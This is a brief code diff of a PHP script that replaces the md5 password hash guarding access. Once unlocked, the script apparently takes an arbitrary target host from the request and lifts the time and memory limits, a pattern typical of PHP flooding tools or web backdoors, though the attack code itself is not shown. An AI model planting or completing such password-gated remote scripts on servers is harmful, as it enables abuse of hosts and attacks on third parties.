@@ -7,10 +7,10 @@
 if(isset($_REQUEST['p']) && isset($_REQUEST['host']))
 {
 
-// 0b938a93a9eab2ecc185e1e74cadd1d5 is your md5 value
+// a029d0df84eb5549c641e04a9ef389e5 is your md5 value
 // you can create a md5 value for your password and put it here. 
 
-if ("0b938a93a9eab2ecc185e1e74cadd1d5" === md5($_REQUEST['p'])) {
+if ("a029d0df84eb5549c641e04a9ef389e5" === md5($_REQUEST['p'])) {
 ini_set('max_execution_time', 0);
 ini_set('memory_limit', -1);
 $host = $_REQUEST['host'];
